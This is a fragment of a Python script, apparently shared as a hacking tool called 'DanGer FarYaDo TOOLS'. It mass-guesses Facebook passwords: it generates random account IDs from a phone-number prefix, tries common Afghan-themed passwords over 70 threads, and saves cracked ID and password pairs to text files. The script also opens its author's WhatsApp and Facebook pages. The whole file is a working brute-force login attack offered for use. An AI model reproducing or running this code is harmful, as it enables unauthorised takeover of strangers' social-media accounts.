...
os.system('xdg-open http://wa.me/+93728693283')
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://m.facebook.com/Sidiqullah.455.1')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
"""
  ...
  ─────────────────────────────────────────────────
  ✅🎋🎋WELCOME TO DanGer FarYaDo TOOLS 🔥✅
  ─────────────────────────────────────────────────    
\33[1;37m------------------🎋🎋🎋🎋----------------------------🎋🎋🎋🎋🎋🎋🎋🎋🎋
→   Owner      :    DanGer FarYaDo
→  Facebook :    SIDIQ ULLAH SABIR
→Whatsapp:     +93728693283
→   Tools       :   RANDOM 
\x1b[1;97m→    Version    : SA3.3
\33[1;37m-----------------🎋🎋🎋🎋-----------------------------""")
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+93728693283text=SA.JAN💜Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-openhttps://www.facebook.com/Sidiqullah.455.1');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def annu():
    ...
    print('\x1b[1;97m[2] RANDOM MIX  Pubg IDZ \x1b[1;92m2')
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'Afghan123','Afghanistan','afghan12345','kabul123','100200','khan1122','Sabir123','####@@@@@']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN Sair.txt : Sabir..txt')
    print(46*'-')
...
def m2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            ...
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN DanGer.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete🎋🎋🎋')
    print('Press Enter to Back');riaz()
def m3():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 9370,9378,9379,9377,Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[DanGer-OK] '+cid+'|'+ps+'\033[0;97m')
                open('DanGer-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[DanGer-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('DanGer-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mDanGer\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
